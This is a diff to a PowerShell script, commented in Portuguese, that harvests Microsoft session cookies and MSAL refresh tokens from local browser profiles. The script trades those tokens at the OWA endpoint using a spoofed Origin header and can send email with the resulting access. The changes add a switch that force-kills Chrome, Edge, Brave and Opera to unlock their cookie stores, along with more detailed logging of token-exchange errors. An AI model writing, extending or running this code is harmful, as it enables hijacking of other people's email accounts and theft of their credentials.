@@ -19,10 +19,12 @@ Fluxo:
 Uso:
   powershell -File rehot.ps1                 # só detecta
   powershell -File rehot.ps1 -SendTo a@b.com # detecta + envia teste
+  powershell -File rehot.ps1 -CloseBrowsers  # fecha navegadores antes (libera perfis travados)
 #>
 param(
     [string]$SendTo = "",
-    [switch]$NoValidate
+    [switch]$NoValidate,
+    [switch]$CloseBrowsers
 )
 
 $ErrorActionPreference = "Stop"
@@ -339,14 +341,27 @@ function Test-MSCookies([string]$profileDir) {
 # ---------------- HTTP: troca / validação / envio ----------------
 function UrlEnc([string]$s) { [System.Uri]::EscapeDataString($s) }
 
+# $script:LastExchangeError guarda o motivo da última troca que falhou (p/
+# diagnosticar "msal=true mas token_read=null" — ex.: refresh revogado, MFA, rede).
+$script:LastExchangeError = $null
 function Exchange-OWAToken([string]$refresh, [string]$client, [string]$scope) {
+    $script:LastExchangeError = $null
     $body = "grant_type=refresh_token&refresh_token=$(UrlEnc $refresh)&client_id=$(UrlEnc $client)&scope=$(UrlEnc $scope)"
     try {
         $resp = Invoke-WebRequest -Uri $OWA_TOKEN_URL -Method Post -Body $body `
             -Headers @{ "Origin" = $OWA_ORIGIN } -ContentType "application/x-www-form-urlencoded" -UseBasicParsing
         $j = $resp.Content | ConvertFrom-Json
         return $j.access_token
-    } catch { return $null }
+    } catch {
+        $script:LastExchangeError = $_.Exception.Message
+        if ($_.Exception.Response) {
+            try {
+                $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
+                $script:LastExchangeError = $script:LastExchangeError + " | " + $sr.ReadToEnd()
+            } catch {}
+        }
+        return $null
+    }
 }
 
 function Test-OWAToken([string]$token) {
@@ -435,6 +450,24 @@ function Get-Profiles([string]$root) {
     return $result
 }
 
+# ---------------- fechar navegadores (libera locks do leveldb/Cookies) ----------------
+# Perfis com navegador aberto ficam BLOQUEADO_NAVEGADOR_ABERTO (arquivo travado).
+# -CloseBrowsers mata os processos antes do scan e dá uma pausa p/ o SO soltar os
+# handles. Retorna a lista de nomes de processo que estavam rodando e foram fechados.
+function Close-Browsers {
+    $procs = @("chrome", "msedge", "brave", "opera", "operagx")
+    $fechados = @()
+    foreach ($p in $procs) {
+        $found = Get-Process -Name $p -ErrorAction SilentlyContinue
+        if ($found) {
+            $found | Stop-Process -Force -ErrorAction SilentlyContinue
+            $fechados += $p
+        }
+    }
+    if ($fechados.Count -gt 0) { Start-Sleep -Milliseconds 800 }
+    return $fechados
+}
+
 # ---------------- análise de um perfil ----------------
 function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]$validate) {
     $cookies = Test-MSCookies $pdir
@@ -479,11 +512,14 @@ function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]
         token_read  = $readTok
         token_write = $writeTok
         write_client = $writeClient
+        exchange_error = if ($msal -and -not $readTok) { $script:LastExchangeError } else { $null }
     }
 }
 
 # ---------------- main ----------------
 $validate = -not $NoValidate.IsPresent
+$fechados = @()
+if ($CloseBrowsers.IsPresent) { $fechados = @(Close-Browsers) }
 $results = @()
 foreach ($b in $browsers) {
     $profiles = Get-Profiles $b.Root
@@ -553,6 +589,7 @@ if ($SendTo) {
 $out = [PSCustomObject]@{
     maquina   = $env:COMPUTERNAME
     timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
+    navegadores_fechados = $fechados
     decisao   = $decisao
     envio     = $envio
     perfis    = $results
